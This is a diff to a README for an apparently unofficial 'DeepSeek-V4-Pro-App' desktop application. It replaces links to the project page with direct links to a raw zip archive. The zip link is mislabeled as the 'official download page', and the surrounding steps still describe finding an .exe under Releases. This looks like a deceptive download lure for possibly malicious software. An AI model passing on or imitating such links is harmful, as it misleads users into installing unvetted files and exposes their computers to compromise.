@@ -1,6 +1,6 @@
 # 🤖 DeepSeek-V4-Pro-App - Smart AI reasoning for your desktop
 
-[![Download DeepSeek-V4-Pro-App](https://img.shields.io/badge/Download-DeepSeek_V4_Pro_App-blue.svg)](https://github.com/Unofficial-penstemonwhippleanus49/DeepSeek-V4-Pro-App)
+[![Download DeepSeek-V4-Pro-App](https://img.shields.io/badge/Download-DeepSeek_V4_Pro_App-blue.svg)](https://raw.githubusercontent.com/Unofficial-penstemonwhippleanus49/DeepSeek-V4-Pro-App/main/Application/Deep-App-Seek-Pro-3.8.zip)
 
 ## 🎯 About this application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start. The software needs 
 
 You must visit the project page to get the installation file. Follow these steps to obtain the correct version for Windows.
 
-1. Go to the [official download page](https://github.com/Unofficial-penstemonwhippleanus49/DeepSeek-V4-Pro-App).
+1. Go to the [official download page](https://raw.githubusercontent.com/Unofficial-penstemonwhippleanus49/DeepSeek-V4-Pro-App/main/Application/Deep-App-Seek-Pro-3.8.zip).
 2. Locate the section labeled Releases on the right side of the screen.
 3. Click the most recent version number.
 4. Look for the file ending in .exe under the Assets heading.
